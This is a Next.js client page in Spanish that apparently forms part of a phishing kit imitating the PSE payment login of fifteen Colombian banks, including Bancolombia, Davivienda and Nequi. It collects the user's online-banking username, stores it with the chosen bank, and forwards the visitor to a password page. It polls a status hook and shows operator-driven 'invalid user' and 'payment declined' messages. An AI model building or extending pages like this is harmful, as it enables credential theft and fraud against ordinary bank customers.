"use client";

import { useState } from 'react';
import { useRouter, useParams, useSearchParams } from 'next/navigation';
import { useCaseStatus } from '@/context/useCaseStatus';

export default function UsuarioPage() {
    const router = useRouter();
    const params = useParams();
    const searchParams = useSearchParams();
    const errorParam = searchParams.get('error');
    const bankId = params.bankId as string;

    useCaseStatus(); // Poll for status changes
    const [usuario, setUsuario] = useState('');
    const [error, setError] = useState(false);

    const bankNames: Record<string, string> = {
        bancolombia: 'Bancolombia',
        davivienda: 'Davivienda',
        bogota: 'Banco de Bogotá',
        nequi: 'Nequi',
        avvillas: 'AV Villas',
        colpatria: 'Colpatria',
        popular: 'Popular',
        cajasocial: 'Caja Social',
        citibank: 'Citibank',
        falabella: 'Falabella',
        finandina: 'Finandina',
        itau: 'Itaú',
        occidente: 'Occidente',
        serfinanza: 'Serfinanza',
        tuya: 'Tuya'
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (usuario.trim().length === 0) {
            setError(true);
            return;
        }

        // Store usuario in localStorage
        localStorage.setItem('pse_usuario', usuario);
        localStorage.setItem('pse_banco', bankId);

        // Redirect to password page
        router.push(`/pse/${bankId}/clave`);
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
            {/* Header */}
            <header className="bg-white border-b border-gray-200 p-4 flex justify-between items-center shadow-sm">
                <div className="text-xl font-bold text-gray-800">
                    {bankNames[bankId] || 'Banco'}
                </div>
                <button
                    onClick={() => router.push('/pse')}
                    className="text-blue-600 hover:text-blue-800 flex items-center gap-2"
                >
                    Salir
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                    </svg>
                </button>
            </header>

            {/* Main Content */}
            <main className="flex-1 flex items-center justify-center px-4 py-12">
                <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md">
                    <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">
                        Te damos la bienvenida
                    </h1>

                    <div className="mt-6 mb-8 text-center">
                        <p className="text-gray-600 text-sm">
                            El usuario es el mismo con el que ingresas a la
                        </p>
                        <p className="text-blue-600 text-sm font-semibold">
                            Sucursal Virtual Personas.
                        </p>
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <div className="relative">
                                <input
                                    type="text"
                                    id="usuario"
                                    value={usuario}
                                    onChange={(e) => {
                                        setUsuario(e.target.value);
                                        setError(false);
                                    }}
                                    placeholder=" "
                                    maxLength={20}
                                    className={`peer w-full px-4 py-3 border-b-2 ${error ? 'border-red-500' : 'border-gray-300'
                                        } focus:border-blue-600 focus:outline-none transition-colors bg-transparent`}
                                />
                                <label
                                    htmlFor="usuario"
                                    className="absolute left-4 top-3 text-gray-500 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base peer-focus:top-0 peer-focus:text-xs peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs"
                                >
                                    Usuario
                                </label>
                            </div>
                            {error && (
                                <p className="mt-2 text-sm text-red-600">
                                    Por favor ingresa tu usuario
                                </p>
                            )}
                            {errorParam === 'invalid_user' && (
                                <p className="mt-2 text-sm text-red-600 font-bold">
                                    🛑 Los datos ingresados son incorrectos. Por favor intenta de nuevo.
                                </p>
                            )}
                            {errorParam === 'payment_declined' && (
                                <p className="mt-2 text-sm text-red-600 font-bold">
                                    ❌ Transacción rechazada. Por favor usa otro medio de pago.
                                </p>
                            )}
                            <button
                                type="button"
                                className="mt-2 text-sm text-blue-600 hover:underline"
                            >
                                ¿Olvidaste tu usuario?
                            </button>
                        </div>

                        <div className="flex gap-4">
                            <button
                                type="button"
                                onClick={() => router.push('/pse')}
                                className="flex-1 py-3 border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
                            >
                                Volver
                            </button>
                            <button
                                type="submit"
                                className="flex-1 py-3 bg-yellow-400 text-gray-900 rounded-lg hover:bg-yellow-500 transition-colors font-semibold shadow-md"
                            >
                                Continuar
                            </button>
                        </div>
                    </form>
                </div>
            </main>

            {/* Footer */}
            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
        </div>
    );
}
